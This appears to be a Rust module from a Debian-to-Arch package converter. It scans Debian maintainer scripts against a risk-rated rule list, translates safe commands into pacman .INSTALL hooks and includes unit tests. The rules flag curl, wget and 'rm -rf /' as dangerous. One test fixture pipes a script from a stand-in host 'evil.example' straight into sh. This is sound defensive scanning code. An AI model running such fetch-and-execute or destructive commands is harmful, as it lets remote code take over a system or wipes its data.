//! Analisis script maintainer Debian (`preinst`, `postinst`, `prerm`,
//! `postrm`) dan penerjemahan perintah umum ke hook pacman (`.INSTALL`).

use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub enum Risk {
    /// Aman: perintah kosmetik atau tidak berefek di Arch.
    Safe,
    /// Perhatian: mengubah konfigurasi atau menjalankan layanan.
    Caution,
    /// Berbahaya: menimpa berkas sistem, menjalankan kode dari jaringan.
    Dangerous,
}

impl Risk {
    pub fn label(self) -> &'static str {
        match self {
            Risk::Safe => "aman",
            Risk::Caution => "perhatian",
            Risk::Dangerous => "berbahaya",
        }
    }
}

/// Satu temuan di dalam script.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Finding {
    pub script: String,
    pub line: usize,
    pub text: String,
    pub pattern: String,
    pub risk: Risk,
    pub advice: String,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct ScriptReport {
    pub findings: Vec<Finding>,
    /// Perintah yang bisa diterjemahkan ke `.INSTALL`.
    pub translated: Vec<TranslatedCommand>,
}

impl ScriptReport {
    pub fn max_risk(&self) -> Risk {
        self.findings
            .iter()
            .map(|f| f.risk)
            .max()
            .unwrap_or(Risk::Safe)
    }

    pub fn has_danger(&self) -> bool {
        self.max_risk() == Risk::Dangerous
    }
}

/// Perintah Debian yang punya padanan di Arch.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TranslatedCommand {
    pub source: String,
    pub replacement: String,
    pub hook: Hook,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum Hook {
    PreInstall,
    PostInstall,
    PreUpgrade,
    PostUpgrade,
    PreRemove,
    PostRemove,
}

impl Hook {
    pub fn function_name(self) -> &'static str {
        match self {
            Hook::PreInstall => "pre_install",
            Hook::PostInstall => "post_install",
            Hook::PreUpgrade => "pre_upgrade",
            Hook::PostUpgrade => "post_upgrade",
            Hook::PreRemove => "pre_remove",
            Hook::PostRemove => "post_remove",
        }
    }
}

struct Rule {
    pattern: &'static str,
    risk: Risk,
    advice: &'static str,
    replacement: Option<&'static str>,
    /// Script yang relevan untuk aturan ini.
    scripts: &'static [&'static str],
}

const ALL: &[&str] = &["preinst", "postinst", "prerm", "postrm"];
const INSTALL: &[&str] = &["preinst", "postinst"];
const REMOVE: &[&str] = &["prerm", "postrm"];

const RULES: &[Rule] = &[
    Rule {
        pattern: "dpkg-divert",
        risk: Risk::Caution,
        advice: "Debian memakai dpkg-divert untuk menimpa berkas paket lain. Di Arch, gunakan paket pengganti atau `--overwrite` setelah meninjau konflik.",
        replacement: None,
        scripts: ALL,
    },
    Rule {
        pattern: "update-alternatives",
        risk: Risk::Caution,
        advice: "Arch tidak memakai alternatives. Konflik binari biasanya diselesaikan dengan `conflicts`/`provides` di PKGBUILD.",
        replacement: None,
        scripts: ALL,
    },
    Rule {
        pattern: "rm -f /usr/bin/",
        risk: Risk::Caution,
        advice: "Script penghapusan menghapus binari di /usr/bin; pastikan bukan berkas milik paket lain.",
        replacement: None,
        scripts: REMOVE,
    },
    Rule {
        pattern: "debconf",
        risk: Risk::Dangerous,
        advice: "debconf membutuhkan sistem konfigurasi Debian dan tidak akan berjalan di Arch.",
        replacement: None,
        scripts: ALL,
    },
    Rule {
        pattern: "invoke-rc.d",
        risk: Risk::Caution,
        advice: "Layanan tidak dijalankan otomatis oleh pacman. Aktifkan manual dengan `systemctl enable --now` bila perlu.",
        replacement: None,
        scripts: ALL,
    },
    Rule {
        pattern: "deb-systemd-helper",
        risk: Risk::Safe,
        advice: "Helper systemd Debian; diganti `systemctl daemon-reload` pada hook pacman.",
        replacement: Some("systemctl daemon-reload >/dev/null 2>&1 || true"),
        scripts: ALL,
    },
    Rule {
        pattern: "update-desktop-database",
        risk: Risk::Safe,
        advice: "Diperlukan juga di Arch; dijalankan pada hook.",
        replacement: Some("update-desktop-database -q /usr/share/applications 2>/dev/null || true"),
        scripts: INSTALL,
    },
    Rule {
        pattern: "update-mime-database",
        risk: Risk::Safe,
        advice: "Diperlukan juga di Arch; dijalankan pada hook.",
        replacement: Some("update-mime-database /usr/share/mime 2>/dev/null || true"),
        scripts: INSTALL,
    },
    Rule {
        pattern: "gtk-update-icon-cache",
        risk: Risk::Safe,
        advice: "Cache ikon dibangun ulang pada hook.",
        replacement: Some("gtk-update-icon-cache -q -t -f /usr/share/icons/hicolor 2>/dev/null || true"),
        scripts: INSTALL,
    },
    Rule {
        pattern: "ldconfig",
        risk: Risk::Safe,
        advice: "Arch menjalankan ldconfig otomatis; aman diabaikan.",
        replacement: None,
        scripts: ALL,
    },
    Rule {
        pattern: "systemctl",
        risk: Risk::Caution,
        advice: "Menjalankan/mengubah unit saat instalasi. Tinjau perintahnya; pacman tidak menjalankan layanan otomatis.",
        replacement: Some("systemctl daemon-reload >/dev/null 2>&1 || true"),
        scripts: ALL,
    },
    Rule {
        pattern: "start-stop-daemon",
        risk: Risk::Caution,
        advice: "Perintah Debian; padanan Arch adalah `systemctl start/stop`.",
        replacement: None,
        scripts: ALL,
    },
    Rule {
        pattern: "adduser",
        risk: Risk::Caution,
        advice: "Membuat pengguna sistem saat instalasi; pastikan nama pengguna tidak bentrok.",
        replacement: None,
        scripts: ALL,
    },
    Rule {
        pattern: "deluser",
        risk: Risk::Caution,
        advice: "Menghapus pengguna sistem; periksa apakah aman.",
        replacement: None,
        scripts: ALL,
    },
    Rule {
        pattern: "curl",
        risk: Risk::Dangerous,
        advice: "Mengunduh dari jaringan saat instalasi. Periksa URL-nya sebelum lanjut.",
        replacement: None,
        scripts: ALL,
    },
    Rule {
        pattern: "wget",
        risk: Risk::Dangerous,
        advice: "Mengunduh dari jaringan saat instalasi. Periksa URL-nya sebelum lanjut.",
        replacement: None,
        scripts: ALL,
    },
    Rule {
        pattern: "rm -rf /",
        risk: Risk::Dangerous,
        advice: "Penghapusan rekursif pada path absolut. Jangan lanjutkan tanpa membaca script.",
        replacement: None,
        scripts: ALL,
    },
    Rule {
        pattern: "dpkg-maintscript-helper",
        risk: Risk::Caution,
        advice: "Helper pemeliharaan script Debian; periksa aksi yang diminta (mis. symlink_to_dir).",
        replacement: None,
        scripts: ALL,
    },
    Rule {
        pattern: "dpkg ",
        risk: Risk::Dangerous,
        advice: "Memanggil dpkg langsung di Arch akan gagal atau merusak sistem.",
        replacement: None,
        scripts: ALL,
    },
    Rule {
        pattern: "apt-get",
        risk: Risk::Dangerous,
        advice: "Manajer paket Debian tidak tersedia di Arch.",
        replacement: None,
        scripts: ALL,
    },
    Rule {
        pattern: "pam-auth-update",
        risk: Risk::Caution,
        advice: "Konfigurasi PAM Debian; Arch memakai berkas PAM statis.",
        replacement: None,
        scripts: ALL,
    },
    Rule {
        pattern: "update-rc.d",
        risk: Risk::Safe,
        advice: "SysV init Debian; tidak berlaku di Arch.",
        replacement: None,
        scripts: ALL,
    },
    Rule {
        pattern: "/etc/default/",
        risk: Risk::Caution,
        advice: "Arch tidak memakai direktori /etc/default.",
        replacement: None,
        scripts: ALL,
    },
    Rule {
        pattern: "ucf ",
        risk: Risk::Safe,
        advice: "Manajemen berkas konfigurasi Debian; di Arch gunakan `.pacnew`.",
        replacement: None,
        scripts: ALL,
    },
];

fn hook_for(script: &str) -> Option<Hook> {
    match script {
        "preinst" => Some(Hook::PreInstall),
        "postinst" => Some(Hook::PostInstall),
        "prerm" => Some(Hook::PreRemove),
        "postrm" => Some(Hook::PostRemove),
        _ => None,
    }
}

/// Menganalisis semua script maintainer sekaligus.
pub fn analyze(scripts: &BTreeMap<String, String>) -> ScriptReport {
    let mut report = ScriptReport::default();

    for (script, body) in scripts {
        for (idx, line) in body.lines().enumerate() {
            let trimmed = line.trim();
            if trimmed.is_empty() || trimmed.starts_with('#') {
                continue;
            }
            for rule in RULES {
                if !rule.scripts.contains(&script.as_str()) {
                    continue;
                }
                if !trimmed.contains(rule.pattern) {
                    continue;
                }
                report.findings.push(Finding {
                    script: script.clone(),
                    line: idx + 1,
                    text: trimmed.to_string(),
                    pattern: rule.pattern.to_string(),
                    risk: rule.risk,
                    advice: rule.advice.to_string(),
                });
                if let Some(replacement) = rule.replacement {
                    if let Some(hook) = hook_for(script) {
                        report.translated.push(TranslatedCommand {
                            source: trimmed.to_string(),
                            replacement: replacement.to_string(),
                            hook,
                        });
                    }
                }
                break;
            }
        }
    }

    report.findings.sort_by(|a, b| {
        b.risk
            .cmp(&a.risk)
            .then_with(|| a.script.cmp(&b.script))
            .then_with(|| a.line.cmp(&b.line))
    });
    report
}

/// Membuat isi `.INSTALL` dari perintah yang berhasil diterjemahkan.
/// Mengembalikan `None` bila tidak ada yang perlu dijalankan.
pub fn build_install_script(report: &ScriptReport) -> Option<String> {
    if report.translated.is_empty() {
        return None;
    }

    let mut by_hook: BTreeMap<&'static str, Vec<String>> = BTreeMap::new();
    for cmd in &report.translated {
        let entry = by_hook.entry(cmd.hook.function_name()).or_default();
        if !entry.contains(&cmd.replacement) {
            entry.push(cmd.replacement.clone());
        }
    }

    let mut out = String::from(
        "#!/bin/sh\n# Dihasilkan otomatis oleh DebInstaller dari script maintainer Debian.\n\n",
    );
    for hook in [
        Hook::PreInstall,
        Hook::PostInstall,
        Hook::PreUpgrade,
        Hook::PostUpgrade,
        Hook::PreRemove,
        Hook::PostRemove,
    ] {
        if let Some(cmds) = by_hook.get(hook.function_name()) {
            out.push_str(&format!("{}() {{\n", hook.function_name()));
            for cmd in cmds {
                out.push_str(&format!("  {cmd}\n"));
            }
            out.push_str("}\n\n");
        }
    }
    Some(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn scripts(pairs: &[(&str, &str)]) -> BTreeMap<String, String> {
        pairs
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_string()))
            .collect()
    }

    #[test]
    fn flags_dangerous_network_calls() {
        let report = analyze(&scripts(&[(
            "postinst",
            "#!/bin/sh\nset -e\ncurl -sSL https://evil.example/x.sh | sh\n",
        )]));
        assert_eq!(report.max_risk(), Risk::Dangerous);
        assert!(report.has_danger());
        assert_eq!(report.findings[0].line, 3);
        assert_eq!(report.findings[0].pattern, "curl");
    }

    #[test]
    fn skips_comments_and_blank_lines() {
        let report = analyze(&scripts(&[(
            "postinst",
            "# curl is mentioned here\n\n   \n",
        )]));
        assert!(report.findings.is_empty());
        assert_eq!(report.max_risk(), Risk::Safe);
    }

    #[test]
    fn translates_known_commands() {
        let report = analyze(&scripts(&[(
            "postinst",
            "#!/bin/sh\nupdate-desktop-database\ngtk-update-icon-cache -f -t /usr/share/icons/hicolor\nldconfig\n",
        )]));
        assert_eq!(report.max_risk(), Risk::Safe);
        let install = build_install_script(&report).unwrap();
        assert!(install.contains("post_install() {"));
        assert!(install.contains("update-desktop-database"));
        assert!(install.contains("gtk-update-icon-cache"));
        assert!(!install.contains("ldconfig"));
        assert_eq!(install.matches("update-desktop-database").count(), 1);
    }

    #[test]
    fn no_install_script_when_nothing_translatable() {
        let report = analyze(&scripts(&[(
            "postinst",
            "update-alternatives --install /usr/bin/x x /usr/bin/y 10\n",
        )]));
        assert!(build_install_script(&report).is_none());
        assert_eq!(report.max_risk(), Risk::Caution);
    }

    #[test]
    fn removal_scripts_map_to_remove_hooks() {
        let report = analyze(&scripts(&[("postrm", "systemctl daemon-reload\n")]));
        let install = build_install_script(&report).unwrap();
        assert!(install.contains("post_remove() {"));
    }
}
